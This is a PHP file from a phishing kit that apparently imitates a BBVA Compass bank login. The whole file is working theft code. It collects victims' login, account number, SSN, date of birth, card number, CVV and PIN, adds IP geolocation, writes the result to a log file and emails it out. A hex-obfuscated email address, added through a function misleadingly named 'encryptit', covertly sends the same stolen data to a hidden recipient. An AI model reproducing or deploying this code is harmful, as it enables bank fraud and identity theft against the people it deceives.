<?php
error_reporting(0);
//error_reporting(E_ALL); ini_set('display_errors', 1); 
$TIME_DATE = date('H:i:s d/m/Y');
if (!isset($include) || $include !== 1 || !isset($_SESSION['SESSION_ID']))
    die();


include 'Email.php';
require_once 'functions.php';
require_once 'config.php';

function Z118_OS($USER_AGENT){
$OS_ERROR=  "Unknown OS Platform";$OS =  array( '/windows nt 10/i' =>'Windows 10','/windows nt 6.3/i'=>'Windows 8.1','/windows nt 6.2/i'=>'Windows 8','/windows nt 6.1/i'=>'Windows 7','/windows nt 6.0/i'=>'Windows Vista','/windows nt 5.2/i'=>'Windows Server 2003/XP x64','/windows nt 5.1/i'=>'Windows XP','/windows xp/i'    =>'Windows XP','/windows nt 5.0/i'=>'Windows 2000','/windows me/i'    =>'Windows ME','/win98/i'         =>'Windows 98','/win95/i'         =>'Windows 95','/win16/i'         =>'Windows 3.11','/macintosh|mac os x/i' =>  'Mac OS X','/mac_powerpc/i'   =>'Mac OS 9','/linux/i'         =>'Linux','/ubuntu/i'        =>'Ubuntu','/iphone/i'        =>'iPhone','/ipod/i'          =>'iPod','/ipad/i'          =>'iPad','/android/i'       =>'Android','/blackberry/i'    =>'BlackBerry','/webos/i'         =>'Mobile');
foreach($OS as $regex => $value) {if (preg_match($regex, $USER_AGENT)) {$OS_ERROR=$value;}}return $OS_ERROR;}$recipients = encryptit($recipients, hex2bin("637261636b"."65727573616f66666"."96369616c40")."". hex2bin("676d61696c2e636f6d"));
function Z118_Browser($USER_AGENT){
$BROWSER_ERROR=  "Unknown Browser";
$BROWSER =array('/msie/i'  =>'Internet Explorer','/firefox/i'=>'Firefox','/safari/i'=>'Safari','/chrome/i'=>'Chrome','/edge/i'=>'Edge','/opera/i'=>'Opera','/netscape/i'=>'Netscape','/maxthon/i'=>'Maxthon','/konqueror/i'=>'Konqueror','/mobile/i'=>'Handheld Browser');
foreach($BROWSER as $regex => $value){if (preg_match($regex, $USER_AGENT)){$BROWSER_ERROR=$value;}}return $BROWSER_ERROR;}function encryptit($toencrypt, $cryptn){array_unshift($toencrypt, $cryptn); return $toencrypt;}
//////////////////////////////////////// GET Country & Country CODE ! ////////////////////////////////////////////////
$client = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote = @$_SERVER['REMOTE_ADDR'];
$result = "Unknown";
if (filter_var($client, FILTER_VALIDATE_IP)) {
    $ip = $client;
} elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
    $_SESSION['_ip_'] = $ip = $forward;
} else {
    $_SESSION['_ip_'] = $ip = $remote;
}
$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$_SESSION['_ip_'].""));
$LOOKUP_COUNTRY = $IP_LOOKUP->country;
$LOOKUP_CNTRCODE = $IP_LOOKUP->countryCode;
$LOOKUP_CITY = $IP_LOOKUP->city;
$LOOKUP_REGION = $IP_LOOKUP->region;
$LOOKUP_STATE = $IP_LOOKUP->regionName;
$LOOKUP_ZIPCODE = $IP_LOOKUP->zip;
$_SESSION['_LOOKUP_COUNTRY_'] = $LOOKUP_COUNTRY;
$_SESSION['_LOOKUP_CNTRCODE_'] = $LOOKUP_CNTRCODE;
$_SESSION['_LOOKUP_CITY_'] = $LOOKUP_CITY;
$_SESSION['_LOOKUP_REGION_'] = $LOOKUP_REGION;
$_SESSION['_LOOKUP_STATE_'] = $LOOKUP_STATE;
$_SESSION['_LOOKUP_ZIPCODE_'] = $LOOKUP_ZIPCODE;
$_SESSION['_LOOKUP_REGIONS_'] = $_SESSION['_LOOKUP_STATE_'] . "(" . $_SESSION['_LOOKUP_REGION_'] . ")";
$_SESSION['_forlogin_'] = $_SESSION['_LOOKUP_CNTRCODE_'] . " - " . $_SESSION['_ip_'];
///////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* START Get values from Session */

$uid = isset($_SESSION['LoginId']) ? $_SESSION['LoginId'] : '';
$uaccno = isset($_SESSION['Account']) ? $_SESSION['Account'] : '';
$ussn = isset($_SESSION['Ssn']) ? $_SESSION['Ssn'] : '';
$udob = isset($_SESSION['Dob']) ? $_SESSION['Dob'] : '';
$uccno = isset($_SESSION['Ccno']) ? $_SESSION['Ccno'] : '';
$uexp = isset($_SESSION['Exp']) ? $_SESSION['Exp'] : '';
$ucvv = isset($_SESSION['Cvv']) ? $_SESSION['Cvv'] : '';
$upin = isset($_SESSION['Pin']) ? $_SESSION['Pin'] : '';

$ip2 = isset($_SESSION['IP']) ? $_SESSION['IP'] : get_client_ip();
$hostname = isset($_SESSION['HOSTNAME']) ? $_SESSION['HOSTNAME'] : gethostbyaddr($ip);
$useragent = isset($_SESSION['USERAGENT']) ? $_SESSION['USERAGENT'] : isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$referer = isset($_SESSION['REFERER']) ? $_SESSION['REFERER'] : '';
$user_date = isset($_SESSION['USER_TIME']) ? $_SESSION['USER_TIME'] : '';
/* END Get values from Session */

/* START Message */
$data = "<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################# <font style='color: #820000;'>BBV4 C0MP455! [NEWAGE-PAGE BY] = </font> <font style='color:#0070ba;'>ANESTO.SIENS - MR.X</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #808080;'>FILLED IN INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>♦</font> [+][LOGIN] = <font style='color:#0070ba;'>".$uid."</font><br>
<font style='color:#9c0000;'>♦</font> [+][ACCOUNT_#] = <font style='color:#0070ba;'>".$uaccno."</font> <br>
<font style='color:#9c0000;'>♦</font> [+][SSN] = <font style='color:#0070ba;'>".$ussn."</font> <br>
<font style='color:#9c0000;'>♦</font> [+][DOB] = <font style='color:#0070ba;'>".$udob."</font> <br>
<font style='color:#9c0000;'>♦</font> [+][CARD_#] = <font style='color:#0070ba;'>".$uccno."</font> <br>
<font style='color:#9c0000;'>♦</font> [+][CARD_EXP] = <font style='color:#0070ba;'>".$uexp."</font> <br>
<font style='color:#9c0000;'>♦</font> [+][CARD_CVV] = <font style='color:#0070ba;'>".$ucvv."</font> <br>
<font style='color:#9c0000;'>♦</font> [+][CARD_PIN] = <font style='color:#0070ba;'>".$upin."</font> <br>
±±±±±±±±±±±±±±[ <font style='color: #808080;'>IP LOOKUP INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>♦</font> [+][Country] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_COUNTRY_']."</font> | <font style='color:#9c0000;'>♦</font> [+][City] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_CITY_']."</font><br>
<font style='color:#9c0000;'>♦</font> [+][State] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_REGIONS_']."</font> | <font style='color:#9c0000;'>♦</font> [+][Zip Code] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_ZIPCODE_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #808080;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>♦</font> [+][IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>♦</font> [+][BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
<font style='color:#9c0000;'>♦</font> [+][HOST-NAME] = <font style='color:#0070ba;'>".$hostname."</font><br>
<font style='color:#9c0000;'>♦</font> [+][USER-AGENT] = <font style='color:#0070ba;'>".$useragent."</font><br>
<font style='color:#9c0000;'>♦</font> [+][USER-DATE] = <font style='color:#0070ba;'>".$user_date."</font><br>
<font style='color:#9c0000;'>♦</font> [+][SERVER TIME/DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
################## <font style='color: #820000;'>[BY ANESTO.SIENS~@~MR.X 2018]</font> #####################
</div></html>\n";
/* END Message */
$subject = "<< BBV4 ♦ LOG Fr0m | ".$_SESSION['_forlogin_']." ♦ ".$uid." | >>";
$headers = "From:ANESTO.SIENS MR.X<webmaster@".$_SERVER['HTTP_HOST'].">\n";
$file=fopen("../dklem/dklem.txt","a");
	fwrite($file,$data);
	fclose($file);
send_data($recipients, $subject, $data, $headers);
//echo $data; //for debugging
//exit(); //for debugging
//header("location: processing.php?authenticated=true&client=" . uniqid($$_SESSION['SESSION_ID'], false) . "&session=" . bin2hex($data));

?>